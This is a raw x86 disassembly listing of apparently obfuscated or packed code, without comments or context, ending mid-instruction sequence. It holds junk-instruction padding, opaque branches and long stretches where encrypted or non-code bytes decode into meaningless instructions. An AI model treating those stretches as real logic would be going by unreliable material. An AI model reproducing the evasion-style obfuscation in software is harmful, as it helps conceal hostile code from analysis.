  412d63:	mov    ebx,DWORD PTR [ebp+0xc]
  412d66:	xor    eax,edi
  412d68:	xor    DWORD PTR ds:0x42844d,0x622f
  412d72:	xor    ecx,edx
  412d74:	mov    DWORD PTR ds:0x428485,0x97b
  412d7e:	mov    DWORD PTR [ebp-0x18],0xa5069aae
  412d85:	mov    DWORD PTR ds:0x42859d,0x75c6
  412d8f:	mov    DWORD PTR [ebp-0x1c],0xa50693ae
  412d96:	mov    DWORD PTR [ebp-0xc],ebx
  412d99:	mov    DWORD PTR ds:0x428579,0x6dfc
  412da3:	cmp    eax,DWORD PTR [ebp-0x10]
  412da6:	jne    0x412db4
  412dac:	cmp    ecx,ebx
  412dae:	je     0x414af6
  412db4:	mov    eax,DWORD PTR [ebp-0x20]
  412db7:	sub    eax,0x3b59
  412dbc:	mov    eax,DWORD PTR [ebp-0x20]
  412dbf:	xor    ecx,ecx
  412dc1:	shld   ecx,eax,0x2
  412dc5:	xor    DWORD PTR ds:0x428431,0x428509
  412dcf:	shl    eax,0x2
  412dd2:	add    DWORD PTR ds:0x428469,0x428501
  412ddc:	xor    ecx,edx
  412dde:	cmp    DWORD PTR ds:0x428501,0x0
  412de5:	not    edx
  412de7:	not    edx
  412de9:	jmp    0x412e3e
  412dee:	mov    DWORD PTR ds:0x42857d,edx
  412df4:	not    edx
  412df6:	cmp    DWORD PTR ds:0x428501,0x0
  412dfd:	je     0x412e29
  412e03:	push   0x8204
  412e08:	push   DWORD PTR [ebp-0x28]
  412e0b:	call   DWORD PTR ds:0x42e010
  412e11:	mov    edx,DWORD PTR ds:0x428449
  412e17:	xor    DWORD PTR ds:0x428579,edx
  412e1d:	mov    edx,DWORD PTR ds:0x428599
  412e23:	sub    DWORD PTR ds:0x428595,edx
  412e29:	inc    edx
  412e2a:	adc    edx,DWORD PTR ds:0x428595
  412e30:	xor    edx,edx
  412e32:	xor    edx,DWORD PTR ds:0x428491
  412e38:	adc    DWORD PTR ds:0x428589,edx
  412e3e:	mov    edx,DWORD PTR [ebp+0x8]
  412e41:	xor    eax,edi
  412e43:	mov    edi,DWORD PTR [ebp+0xc]
  412e46:	mov    DWORD PTR ds:0x428381,0x757
  412e50:	cmp    eax,edx
  412e52:	mov    DWORD PTR ds:0x428351,0x1fab
  412e5c:	jne    0x412e74
  412e62:	cmp    ecx,edi
  412e64:	mov    DWORD PTR ds:0x428395,0x4385
  412e6e:	je     0x414af6
  412e74:	add    eax,DWORD PTR ds:0x428451
  412e7a:	mov    eax,DWORD PTR [ebp-0x1c]
  412e7d:	neg    DWORD PTR ds:0x428359
  412e83:	mov    ecx,DWORD PTR [ebp-0x1c]
  412e86:	push   0xfffffffe
  412e88:	and    DWORD PTR ds:0x428391,edx
  412e8e:	pop    ebx
  412e8f:	or     DWORD PTR ds:0x42859d,edx
  412e95:	jmp    0x4131ce
  412e9a:	imul   ebx,DWORD PTR [edi+0x1cbccb74],0xf12aa079
  412ea4:	and    BYTE PTR [esi-0x6f2e6a22],bl
  412eaa:	mov    WORD PTR [eax-0x42],?
  412ead:	mov    esi,0xbebec4ed
  412eb2:	cwde   
  412eb3:	sbb    ebx,DWORD PTR [ebx]
  412eb5:	les    ebx,FWORD PTR [eax-0x25]
  412eb8:	lods   eax,DWORD PTR ds:[esi]
  412eb9:	inc    ecx
  412eba:	pop    esp
  412ebb:	ja     0x412ef4
  412ebd:	cwde   
  412ebe:	fyl2x  
  412ec0:	repz push ebx
  412ec2:	dec    esi
  412ec3:	ins    DWORD PTR es:[edi],dx
  412ec4:	rol    edi,0x58
  412ec7:	xor    ch,BYTE PTR [esi]
  412ec9:	pop    ss
  412eca:	xor    eax,0xa04abfb6
  412ecf:	std    
  412ed0:	and    dl,bh
  412ed2:	pop    esi
  412ed3:	int3   
  412ed4:	jge    0x412ee0
  412ed6:	fst    QWORD PTR ss:[esp+eax*1-0x607a5a4c]
  412ede:	ficom  DWORD PTR [esi-0x72]
  412ee1:	mov    bl,0x43
  412ee3:	pop    ebx
  412ee4:	int    0x8a
  412ee6:	call   DWORD PTR ds:0x1e3c10f1
  412eec:	adc    bl,BYTE PTR [esp+esi*2+0x5d]
  412ef0:	hlt    
  412ef1:	test   edi,0x7c7c130f
  412ef7:	push   ebp
  412ef8:	jg     0x412ed8
  412efa:	loop   0x412ebe
  412efc:	dec    ecx
  412efd:	icebp  
  412efe:	inc    esp
  412eff:	and    DWORD PTR [bx+di],ebp
  412f02:	rol    BYTE PTR [ecx+0xf],0xc4
  412f06:	cwde   
  412f07:	dec    esp
  412f08:	test   BYTE PTR [edi-0x564d985a],cl
  412f0e:	xchg   DWORD PTR [ebx-0x361ac7a0],edx
  412f14:	fwait
  412f15:	push   0x2f
  412f17:	aas    
  412f18:	inc    ebx
  412f19:	stos   DWORD PTR es:[edi],eax
  412f1a:	lods   eax,DWORD PTR ds:[esi]
  412f1b:	out    dx,al
  412f1c:	push   ds
  412f1d:	mov    fs,WORD PTR [ecx]
  412f1f:	pop    esp
  412f20:	mov    bl,0x2
  412f22:	cs dec eax
  412f24:	popf   
  412f25:	les    esi,FWORD PTR [ebx+0x19c81e42]
  412f2b:	sub    DWORD PTR [edx-0x29233aa1],0xf2624875
  412f35:	add    eax,0xb2b24fcc
  412f3a:	sub    al,0x23
  412f3c:	(bad)  
  412f3d:	cmp    eax,0x6ab4357a
  412f42:	fadd   DWORD PTR [ebx+0x5a63aa3f]
  412f48:	lock dec ecx
  412f4a:	(bad)  [eax+0x59]
  412f4d:	and    BYTE PTR [edx+0x22],bl
  412f50:	mov    cl,0x32
  412f52:	test   ah,cl
  412f54:	dec    ebp
  412f55:	repz add eax,0xbe59691e
  412f5b:	adc    eax,0xfb213aca
  412f60:	repnz dec ebp
  412f62:	dec    ebx
  412f63:	push   cs
  412f64:	push   ebx
  412f65:	jg     0x412f64
  412f67:	pop    eax
  412f68:	and    al,ch
  412f6a:	cmp    BYTE PTR ds:0xa54019d1,bh
  412f70:	mov    ecx,0x1e86a10
  412f75:	pushf  
  412f76:	jg     0x412ef8
  412f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f79:	mov    cl,0xfb
  412f7b:	lea    ecx,[ecx]
  412f7d:	loopne 0x412fe5
  412f7f:	xchg   esi,eax
  412f80:	jae    0x412f67
  412f82:	add    DWORD PTR [ecx],0xffffffdf
  412f85:	int    0x2
  412f87:	loopne 0x412f63
  412f89:	fs pop edx
  412f8b:	xchg   edi,eax
  412f8c:	test   al,0x50
  412f8e:	mov    eax,ds:0x5b18bb50
  412f93:	(bad)
  412f97:	fstp   TBYTE PTR [ebx]
  412f99:	fld    DWORD PTR [esi-0x3390e191]
  412f9f:	ins    DWORD PTR es:[edi],dx
  412fa0:	hlt    
  412fa1:	mov    bl,0xf7
  412fa3:	push   edi
  412fa4:	dec    esi
  412fa5:	jns    0x412f53
  412fa7:	sub    al,0xb7
  412faa:	outs   dx,DWORD PTR ds:[esi]
  412fab:	lods   ax,WORD PTR ds:[esi]
  412fad:	ja     0x412f60
  412faf:	push   edx
  412fb0:	or     eax,0xc22747e6
  412fb5:	jg     0x412fb3
  412fb7:	es fs sahf 
  412fba:	xchg   ebx,eax
  412fbb:	and    BYTE PTR [edx+0x5a],cl
  412fbe:	dec    edi
  412fbf:	ret    0x5e3b
  412fc2:	pusha  
  412fc3:	push   es
  412fc4:	xchg   esi,eax
  412fc5:	xor    BYTE PTR [edx-0xe5eb613],al
  412fcb:	hlt    
  412fcc:	push   edx
  412fcd:	mov    ch,0x34
  412fcf:	test   BYTE PTR [esi+ebp*8],cl
  412fd2:	mov    ebp,0xa8cbe3f0
  412fd7:	xchg   esi,eax
  412fd8:	adc    edx,DWORD PTR [eax]
  412fda:	sbb    ebx,DWORD PTR [esi]
  412fdc:	adc    al,0x3
  412fde:	out    dx,al
  412fdf:	icebp  
  412fe0:	inc    ebp
  412fe1:	cmp    bl,BYTE PTR [ebp+0x1f91a05f]
  412fe7:	pushf  
  412fe8:	fmul   QWORD PTR [edi+0x36]
  412feb:	mov    al,0xc8
  412fed:	repz fstp TBYTE PTR [ebx-0x1738866a]
  412ff4:	or     DWORD PTR [ecx-0x14913d53],eax
  412ffa:	out    dx,eax
  412ffb:	xchg   edi,eax
  412ffc:	xchg   ebx,eax
  412ffd:	push   esi
  412ffe:	(bad)  
  412fff:	fidivr WORD PTR [edi]
  413001:	stos   BYTE PTR es:[edi],al
  413002:	cmp    eax,0x351b968f
  413007:	xchg   DWORD PTR [ecx+0x619d813a],ebp
  41300d:	fxch   st(0)
  41300f:	inc    ebx
  413010:	sti    
  413011:	ror    BYTE PTR [ebx-0x53],0x36
  413015:	aad    0x69
  413017:	out    0xe8,al
  413019:	xchg   ecx,eax
  41301a:	adc    al,0x2b
  41301c:	cwde   
  41301d:	adc    ch,BYTE PTR [ebx-0xfd9e089]
  413023:	add    BYTE PTR cs:[edx+edx*8],0x65
  413028:	(bad)  
  413029:	loope  0x412fd1
  41302b:	sub    BYTE PTR [ebx+0x7edbe361],dh
  413031:	pop    ebp
  413032:	repnz push 0x4
  413035:	shl    edx,1
  413037:	add    esp,DWORD PTR [eax]
  413039:	inc    edx
  41303a:	cmp    edi,DWORD PTR [ebp-0x15f6b16c]
  413040:	ins    DWORD PTR es:[edi],dx
  413041:	ja     0x4130a1
  413043:	pop    esp
  413044:	dec    edx
  413045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413046:	jae    0x41301f
  413048:	cmp    eax,0x8e3ac036
  41304d:	jnp    0x412fe8
  41304f:	cmp    BYTE PTR [ebp+ecx*8-0x5d],dh
  413053:	push   edx
  413054:	iret   
  413055:	xchg   ecx,eax
  413056:	add    al,0xb
  413058:	mov    ss,WORD PTR [eax+0x68ba7b56]
  41305e:	je     0x413057
  413060:	inc    eax
  413061:	push   ecx
  413062:	mov    dh,0xd5
  413064:	push   eax
  413065:	std    
  413066:	loope  0x4130c9
  413068:	adc    eax,0xec99f7e0
  41306d:	cwde   
  41306e:	lock xor BYTE PTR [ecx+edx*2-0x32192318],dl
  413076:	mov    al,ds:0x603dca9c
  41307b:	retf   0xc491
  41307e:	fmul   DWORD PTR [edi]
  413080:	cmp    eax,0x18383fcb
  413085:	pop    eax
  413086:	rcr    BYTE PTR [edx],0x7a
  413089:	inc    ebx
  41308a:	push   ebx
  41308b:	(bad)
  41308f:	call   0xa02a:0x450d5dfb
  413096:	call   0xb866f8ae
  41309b:	idiv   DWORD PTR [ecx+0x1]
  41309e:	(bad)  
  41309f:	jns    0x413036
  4130a1:	xchg   DWORD PTR [edx+0x2],ecx
  4130a4:	fldenv [edx+0x25]
  4130a7:	dec    edi
  4130a8:	fdivr  DWORD PTR [ebx+0x1b83f60]
  4130ae:	mov    al,BYTE PTR [ecx-0x307ae89f]
  4130b4:	lds    ebp,FWORD PTR [ebp-0x414d1dfe]
  4130ba:	cld    
  4130bb:	sub    bh,BYTE PTR [edx+0x2b]
  4130be:	mov    bh,0xaa
  4130c0:	sub    al,ch
  4130c2:	and    DWORD PTR [edi+0x192815ea],ecx
  4130c8:	jle    0x413085
  4130ca:	imul   edi,DWORD PTR [ebp+0xc1979d9],0x5f87309d
  4130d4:	iret   
  4130d5:	xchg   edx,eax
  4130d6:	imul   edi,DWORD PTR [esi],0x4c
  4130d9:	pushf  
  4130da:	sub    eax,0x5fb05088
  4130df:	je     0x413156
  4130e1:	addr16 pop eax
  4130e3:	fwait
  4130e4:	and    al,0x14
  4130e6:	mov    eax,ds:0x4a80e1b5
  4130eb:	mov    edi,0x4da34c3
  4130f0:	in     eax,dx
  4130f1:	lods   eax,DWORD PTR ds:[esi]
  4130f2:	loop   0x4130ca
  4130f4:	sbb    ebx,ebp
  4130f6:	push   ds
  4130f7:	mov    DWORD PTR [edx+ebx*2-0x148bc535],ecx
  4130fe:	dec    ebp
  4130ff:	mov    ds:0x1b67d75d,eax
  413104:	jnp    0x413089
  413106:	add    al,0xc5
  413108:	push   cs
  413109:	inc    ebx
  41310a:	cmp    ecx,DWORD PTR [ecx+0xa]
  41310d:	stos   BYTE PTR es:[edi],al
  41310e:	addr16 jmp 0x4130bc
  413111:	jmp    0xf79d4a76
  413116:	add    DWORD PTR [edx+edx*2],0x28
  41311a:	pop    edx
  41311b:	call   0xd1b98c72
  413120:	fdivr  QWORD PTR [ebx-0x1293fa83]
  413126:	or     al,0xcb
  413129:	fsub   QWORD PTR [ecx]
  41312b:	adc    bl,BYTE PTR [edi-0x78]
  41312e:	inc    edx
  41312f:	xchg   ebx,eax
  413130:	sub    dh,dl
  413132:	sbb    al,0x50
  413134:	push   esi
  413135:	adc    al,0x8a
  413137:	fcomip st,st(4)
  413139:	enter  0x5fc5,0x80
  41313d:	or     al,0x4b
  41313f:	or     ebx,ebp
  413141:	lods   al,BYTE PTR ds:[esi]
  413142:	jmp    0x4131ad
  413144:	or     bl,ah
  413146:	jl     0x4130d6
  413148:	mov    ah,0x14
  41314a:	lea    esi,[ebx+0x5f27bdc0]
  413150:	jno    0x41311a
  413152:	ins    BYTE PTR es:[edi],dx
  413153:	inc    ebp
  413154:	mov    dh,0xb8
  413156:	or     DWORD PTR [edx-0x23],0xffffffc6
  41315a:	inc    bp
  41315c:	mov    eax,0x2a5f3b6e
  413161:	test   DWORD PTR [ebx+0x5147b7f7],esp
  413167:	sbb    edi,esp
  413169:	mov    dl,0x84
  41316b:	data16 mov ss,WORD PTR [edi-0x2c]
  41316f:	sahf   
  413170:	ret    
  413171:	cmp    edx,esi
  413173:	pop    ebx
  413174:	in     eax,0x87
  413176:	add    al,0xac
  413178:	loopne 0x413175
  41317a:	shl    ebx,1
  41317c:	and    BYTE PTR [ebp+edx*4-0x2d],dl
  413180:	out    dx,eax
  413181:	sub    al,0x8e
  413183:	adc    eax,ebx
  413185:	stos   BYTE PTR es:[edi],al
  413186:	inc    edi
  413187:	push   edx
  413188:	pop    eax
  413189:	fcom   DWORD PTR [ebx+0x42]
  41318c:	enter  0xc14b,0xa6
  413190:	sub    eax,0x566ad548
  413195:	xlat   BYTE PTR ds:[ebx]
  413196:	fisubr DWORD PTR [ebx-0x4ec6d44b]
  41319c:	xchg   ebp,eax
  41319d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41319e:	or     al,0x17
  4131a0:	rcr    ecx,cl
  4131a2:	cmp    al,0x94
  4131a4:	test   BYTE PTR [edi],dl
  4131a6:	scas   eax,DWORD PTR es:[edi]
  4131a7:	mov    eax,ds:0x48dfdb2d
  4131ac:	jae    0x413161
  4131ae:	fiadd  DWORD PTR [esi-0x7e017585]
  4131b4:	(bad)  
  4131b5:	jns    0x413198
  4131b7:	cmp    eax,0xbe93dbd1
  4131bc:	pop    ds
  4131bd:	cld    
  4131be:	inc    eax
  4131bf:	lods   eax,DWORD PTR ds:[esi]
  4131c0:	dec    edi
  4131c1:	jae    0x41319b
  4131c3:	sub    edx,DWORD PTR [eax]
  4131c5:	in     eax,0x77
  4131c7:	out    0xaf,al
  4131c9:	mov    ds:0x66083192,eax
  4131ce:	xor    ecx,ebx
  4131d0:	xor    edi,edi
  4131d2:	add    edi,DWORD PTR ds:0x428455
  4131d8:	sub    DWORD PTR ds:0x428435,edi
  4131de:	shl    ecx,0x1e
  4131e1:	xor    DWORD PTR ds:0x428385,0x3d84
  4131eb:	mov    edi,0xa5069baf
  4131f0:	xor    eax,edi
  4131f2:	shr    eax,0x2
  4131f5:	jmp    0x41352e
  4131fa:	jmp    0x8a913c60
  4131ff:	mov    eax,0x40087bbc
  413204:	push   0xffffffd1
  413206:	sahf   
  413207:	rol    cl,1
  413209:	iret   
  41320a:	mov    esp,0xedbebe7e
  41320f:	les    edi,FWORD PTR [esi-0x25d16a42]
  413215:	ret    
  413216:	cmp    edx,edx
  413218:	jmp    ebx
  41321a:	shl    BYTE PTR [eax+eax*4-0x1e3cac65],0xbc
  413222:	(bad)  
  413223:	add    DWORD PTR [edi+eiz*8+0x3018fc92],ebp
  41322a:	out    dx,eax
  41322b:	jmp    0x41328b
  41322d:	mov    DWORD PTR [edx-0x5c],eax
  413230:	sub    eax,0x5b613729
  413235:	sbb    BYTE PTR [ebp-0x70d91eb8],dh
  41323b:	stos   DWORD PTR es:[edi],eax
  41323c:	fstp   QWORD PTR [ebx-0x16]
  41323f:	mov    ch,0x86
  413241:	inc    esi
  413242:	dec    eax
  413243:	mov    bl,0xb0
  413245:	std    
  413246:	add    eax,0xddebd94d
  41324b:	mov    BYTE PTR [esi-0x548d74c7],dh
  413251:	in     eax,0xf4
  413253:	lock stos BYTE PTR es:[edi],al
  413255:	in     al,0x13
  413257:	mov    eax,0xcc34c9f4
  41325c:	xor    al,0xf0
  41325e:	jp     0x4132b7
  413260:	add    ecx,0xa25e5503
  413266:	dec    esi
  413267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413268:	inc    ebx
  413269:	jmp    0x4132b3
  41326b:	int3   
  41326c:	test   edx,0x2056a42
  413272:	daa    
  413273:	sbb    BYTE PTR [edx-0x4d525f92],0x12
  41327a:	in     eax,dx
  41327b:	mov    dh,0x3b
  41327d:	cmp    al,BYTE PTR [ebx]
  41327f:	addr16 cli 
  413281:	daa    
  413282:	xor    ebx,DWORD PTR [edx-0x44af8d63]
  413288:	mov    bh,BYTE PTR [ecx]
  41328a:	add    DWORD PTR [ecx-0x24],edi
  41328d:	jno    0x4132b5
  41328f:	pop    ecx
  413290:	push   0xe016681
  413295:	inc    eax
  413296:	push   ds
  413297:	push   eax
  413298:	std    
  413299:	aaa    
  41329a:	adc    esp,DWORD PTR [edx]
  41329c:	xchg   BYTE PTR [ecx-0x18],ah
  41329f:	dec    ecx
  4132a0:	test   BYTE PTR [edx],ah
  4132a2:	or     al,BYTE PTR [ecx-0x3384ce2d]
  4132a8:	fwait
  4132a9:	pushf  
  4132aa:	mov    edi,0xeee59f9c
  4132af:	xchg   ebx,eax
  4132b0:	mov    esp,0xb2464ad9
  4132b5:	add    eax,DWORD PTR [edi-0x6c6eb7ee]
  4132bb:	cdq    
  4132bc:	or     bh,BYTE PTR [ebx+0x2b]
  4132bf:	inc    edi
  4132c0:	cmp    edi,esi
  4132c2:	sub    eax,0x37c7c259
  4132c7:	pop    esp
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	es repnz dec edi
  4132cc:	imul   esp,DWORD PTR [ebp-0x194410a3],0xedccb3c2
  4132d6:	cmp    al,0xf7
  4132d8:	or     eax,0x575f40df
  4132dd:	inc    eax
  4132de:	xor    ah,BYTE PTR [ebx+eiz*2]
  4132e1:	jmp    0xa1bc:0xff4c48d9
  4132e8:	daa    
  4132e9:	jmp    0x4132ae
  4132eb:	mov    edx,0xc095a0ea
  4132f0:	test   al,0x83
  4132f2:	jo     0x41335f
  4132f4:	sti    
  4132f5:	xor    bh,bl
  4132f7:	sub    edx,ebp
  4132f9:	inc    edx
  4132fa:	xchg   esi,eax
  4132fb:	xor    BYTE PTR ds:0x30d9de73,0xde
  413302:	xchg   DWORD PTR [eax-0x4db92628],ecx
  413308:	jo     0x413338
  41330a:	mov    ?,ecx
  41330c:	sub    esp,DWORD PTR [esi]
  41330e:	test   al,0xea
  413310:	int    0x4
  413312:	jecxz  0x413304
  413314:	cmp    ebx,DWORD PTR [esi-0x66e58841]
  41331a:	mul    BYTE PTR [ebp+eax*4+0x7af74911]
  413321:	adc    esi,DWORD PTR [edx+0x6f12c4e0]
  413327:	mov    ebp,0x81fc6ee5
  41332c:	clc    
  41332d:	(bad)  
  41332f:	nop
  413330:	inc    esp
  413331:	jbe    0x4132d1
  413333:	arpl   WORD PTR [ecx],ax
  413335:	mov    bl,0xd
  413337:	cmp    eax,0x4f3cf2c7
  41333c:	add    eax,DWORD PTR [edx+0x52acbcc6]
  413342:	xor    cl,dh
  413344:	pusha  
  413345:	call   0x4f4082d3
  41334a:	or     al,0x5
  41334c:	sbb    eax,0x46b2d369
  413351:	js     0x41333b
  413353:	xchg   esp,eax
  413354:	or     cl,BYTE PTR [ebx+ebp*2]
  413357:	les    edi,FWORD PTR [edx]
  413359:	xlat   BYTE PTR ds:[ebx]
  41335a:	fwait
  41335b:	pusha  
  41335c:	shl    BYTE PTR [edi+ebx*4+0x6f6abbc0],1
  413363:	idiv   BYTE PTR [edx-0x44e43ca9]
  413369:	outs   dx,DWORD PTR ds:[esi]
  41336a:	ror    BYTE PTR [edx-0x24],cl
  41336d:	ret    0xf916
  413370:	ret    0x6b81
  413373:	test   DWORD PTR [edx],0x51cc2af5
  413379:	dec    ecx
  41337a:	dec    ecx
  41337b:	mov    ebx,0xa0cb969
  413380:	xor    dl,al
  413382:	sbb    DWORD PTR [ebx-0x22d6e847],0x45
  413389:	xchg   ebp,edi
  41338b:	and    cl,bh
  41338d:	xchg   esp,eax
  41338e:	stos   BYTE PTR es:[edi],al
  41338f:	cli    
  413390:	add    al,0x5d
  413392:	mov    bh,0xab
  413394:	out    0xa2,al
  413396:	div    DWORD PTR ds:0xe46caff
  41339c:	mov    ah,0x7a
  41339e:	jo     0x4133ec
  4133a0:	xchg   edx,eax
  4133a1:	cmp    al,0xfb
  4133a3:	mov    cl,0x7c
  4133a5:	mov    dh,0x7e
  4133a7:	push   edx
  4133a8:	in     al,0x96
  4133aa:	jecxz  0x41333e
  4133ac:	(bad)  
  4133ad:	clc    
  4133ae:	jb     0x4133f3
  4133b0:	outs   dx,DWORD PTR ds:[esi]
  4133b1:	sbb    BYTE PTR [eax+0x2],0xc3
  4133b5:	jl     0x413395
  4133b7:	gs scas eax,DWORD PTR es:[edi]
  4133b9:	inc    ecx
  4133ba:	int    0x86
  4133bc:	mov    dl,0x9b
  4133be:	cwde   
  4133bf:	xor    dl,cl
  4133c1:	pop    ds
  4133c2:	mov    ch,0x7d
  4133c4:	hlt    
  4133c5:	ficomp WORD PTR [ecx-0x242cd99d]
  4133cb:	push   ebx
  4133cc:	mov    dh,0x2d
  4133ce:	sti    
  4133cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133d0:	cmp    al,0xe0
  4133d2:	imul   edi,DWORD PTR [ebp-0x65ee8ca0],0x720d6556
  4133dc:	stos   DWORD PTR es:[edi],eax
  4133dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133de:	mov    ds:0xb1da65bd,al
  4133e3:	cmc    
  4133e4:	mov    edx,fs
  4133e6:	mov    ds:0x239c9f84,eax
  4133eb:	fistp  QWORD PTR [ebx-0x44]
  4133ee:	and    bh,dh
  4133f0:	ret    
  4133f1:	mov    eax,ds:0x520fc3e8
  4133f6:	ss cwde 
  4133f8:	repz push es
  4133fa:	jo     0x4133ec
  4133fc:	stc    
  4133fd:	inc    ebp
  4133fe:	test   BYTE PTR [ecx+0x1d98357b],0xbf
  413405:	mov    esi,0x53c9629b
  41340a:	dec    esp
  41340b:	mov    dh,0xa3
  41340d:	cmp    cl,ah
  41340f:	cs sub esp,edx
  413412:	jge    0x413493
  413414:	jle    0x413425
  413416:	push   ds
  413417:	mov    DWORD PTR [edi-0x6faecb5b],esi
  41341d:	push   esp
  41341e:	mov    ecx,0x9d76ee27
  413423:	cld    
  413424:	loopne 0x41344c
  413426:	fdiv   QWORD PTR [eax-0x7c3334a2]
  41342c:	sbb    BYTE PTR [edi-0xe],0xe5
  413430:	and    esp,ebp
  413432:	je     0x41342a
  413434:	push   esi
  413435:	xchg   BYTE PTR [ebp+eax*2+0x2c1becf3],al
  41343c:	mov    bl,0x3d
  41343f:	inc    ebx
  413440:	pop    ds
  413441:	sbb    BYTE PTR [ebx+0x10],dl
  413444:	les    eax,FWORD PTR [ebp-0x42fd5546]
  41344a:	enter  0x8fb6,0x13
  41344e:	mov    ebx,0xc4a69c1e
  413453:	clc    
  413454:	fwait
  413455:	cmp    al,0xfc
  413457:	cmp    al,0x68
  413459:	ins    BYTE PTR es:[edi],dx
  41345a:	and    al,0x42
  41345c:	test   al,0x8d
  41345e:	out    dx,al
  41345f:	fcmovnbe st,st(4)
  413461:	rcl    BYTE PTR [ecx-0x68130a64],cl
  413467:	mov    al,0x97
  413469:	dec    esi
  41346a:	pop    ds
  41346b:	lahf   
  41346c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41346d:	mov    ds:0xdb054bd,al
  413472:	xor    ebx,0x4a
  413475:	push   cs
  413476:	out    dx,eax
  413477:	int3   
  413478:	mov    ecx,0x53950ecf
  41347d:	call   0xabaab6cd
  413482:	test   DWORD PTR [ecx],eax
  413484:	mov    BYTE PTR [eax-0x612e8723],ah
  41348a:	sub    dh,BYTE PTR [ebx+0xf7d997]
  413490:	xor    eax,0xe2c97588
  413495:	in     al,dx
  413496:	loop   0x413474
  413498:	fild   DWORD PTR [esi-0x8]
  41349b:	push   ebx
  41349c:	stos   BYTE PTR es:[edi],al
  41349d:	add    ebp,DWORD PTR [edi]
  41349f:	push   esi
  4134a1:	mov    ss,WORD PTR [edi-0x1f8b8e55]
  4134a7:	lea    edi,[edi]
  4134a9:	shl    BYTE PTR ds:0xeae10cdd,cl
  4134af:	popa   
  4134b0:	ss test al,0xb3
  4134b3:	cmp    DWORD PTR [edi+0x7337ca06],0xffffff81
  4134ba:	push   cs
  4134bb:	xchg   ebp,eax
  4134bc:	imul   bh
  4134be:	sub    eax,0xa9d848a5
  4134c3:	mov    bl,0x54
  4134c5:	div    DWORD PTR [eax+0x4ed3311a]
  4134cb:	aas    
  4134cc:	in     eax,0x32
  4134ce:	pop    ss
  4134cf:	stos   BYTE PTR es:[edi],al
  4134d0:	mov    eax,0xd5ca871d
  4134d5:	fist   WORD PTR [eax-0x9]
  4134d8:	dec    edi
  4134d9:	pop    ds
  4134da:	loopne 0x4134eb
  4134dc:	outs   dx,DWORD PTR ds:[esi]
  4134dd:	add    eax,0x94923523
  4134e2:	mov    ebp,edx
  4134e4:	or     BYTE PTR [esp+edx*2],0xb1
  4134e8:	push   0xffffffc0
  4134ea:	js     0x413492
  4134ec:	jl     0x413509
  4134ee:	push   ss
  4134ef:	sub    ah,ah
  4134f1:	retf   
  4134f2:	adc    eax,0x6fc9b9fe
  4134f7:	test   al,0x78
  4134f9:	sbb    ebp,ebp
  4134fb:	jmp    0x413555
  4134fd:	lds    eax,FWORD PTR [edx+0x70]
  413500:	call   0x74ff:0x1f54e547
  413507:	mov    ch,0x14
  413509:	(bad)  
  41350a:	mov    ss:0xdfac258f,al
  413510:	inc    edx
  413511:	add    al,0xd
  413513:	mov    al,bl
  413515:	in     al,0x47
  413517:	addr16 pop ds
  413519:	jmp    0x8df5f234
  41351e:	or     BYTE PTR [ecx-0x498e8f47],al
  413524:	call   0x167c7c86
  413529:	js     0x4134f7
  41352b:	aas    
  41352c:	out    0xbe,eax
  41352e:	or     eax,ecx
  413530:	cmp    DWORD PTR ds:0x428351,0x0
  413537:	mov    DWORD PTR ds:0x428461,0x5b09
  413541:	movzx  ecx,WORD PTR ds:0x428379
  413548:	jmp    0x413626
  41354d:	mov    DWORD PTR ds:0x42838d,0x463b
  413557:	cmp    DWORD PTR ds:0x428351,0x0
  41355e:	ja     0x413594
  413564:	push   0x1092
  413569:	push   0x34c2
  41356e:	push   DWORD PTR [ebp-0x10]
  413571:	push   0x63e1
  413576:	push   0x4282b5
  41357b:	push   DWORD PTR [ebp-0x24]
  41357e:	call   DWORD PTR ds:0x42e0d8
  413584:	adc    DWORD PTR ds:0x428519,0x3ae5
  41358e:	or     ecx,DWORD PTR ds:0x428569
  413594:	mov    ecx,DWORD PTR ds:0x4284f9
  41359a:	xor    DWORD PTR ds:0x428585,ecx
  4135a0:	add    DWORD PTR ds:0x4284e5,0x73c1
  4135aa:	xor    DWORD PTR ds:0x4284f1,0x45f8
  4135b4:	cmp    DWORD PTR ds:0x42851d,0x0
  4135bb:	mov    ecx,0x9c7
  4135c0:	mov    DWORD PTR ds:0x42836d,0x5708
  4135ca:	mov    DWORD PTR ds:0x4284f1,0x67de
  4135d4:	jmp    0x413626
  4135d9:	mov    ecx,DWORD PTR ds:0x42836d
  4135df:	cmp    DWORD PTR ds:0x42851d,0x0
  4135e6:	jl     0x413613
  4135ec:	push   DWORD PTR [ebp-0x14]
  4135ef:	push   DWORD PTR [ebp-0x10]
  4135f2:	push   DWORD PTR [ebp-0x28]
  4135f5:	call   DWORD PTR ds:0x42e0dc
  4135fb:	adc    DWORD PTR ds:0x42844d,edx
  413601:	mov    ecx,DWORD PTR ds:0x428361
  413607:	and    DWORD PTR ds:0x42856d,ecx
  41360d:	and    DWORD PTR ds:0x428375,edx
  413613:	mov    ecx,DWORD PTR ds:0x428441
  413619:	xor    ecx,DWORD PTR ds:0x428471
  41361f:	mov    DWORD PTR ds:0x428441,ecx
  413625:	dec    ecx
  413626:	mov    DWORD PTR [ebp-0xc],eax
  413629:	cmp    DWORD PTR ds:0x428469,0x0
  413630:	mov    DWORD PTR ds:0x428445,0x7db5
  41363a:	mov    DWORD PTR ds:0x42847d,edi
  413640:	jmp    0x4136bd
  413645:	mov    ecx,DWORD PTR ds:0x428355
  41364b:	mov    eax,ds:0x42845d
  413650:	cmp    DWORD PTR ds:0x428469,0x0
  413657:	je     0x4136a7
  41365d:	push   DWORD PTR [ebp-0x20]
  413660:	push   DWORD PTR [ebp-0x28]
  413663:	push   DWORD PTR [ebp-0x28]
  413666:	push   DWORD PTR [ebp-0xc]
  413669:	push   DWORD PTR [ebp-0x18]
  41366c:	push   DWORD PTR [ebp-0xc]
  41366f:	push   DWORD PTR [ebp-0x14]
  413672:	push   DWORD PTR [ebp-0x1c]
  413675:	push   DWORD PTR [ebp-0x20]
  413678:	push   DWORD PTR [ebp-0x14]
  41367b:	push   0x6fca
  413680:	push   DWORD PTR [ebp-0x14]
  413683:	push   0x1843
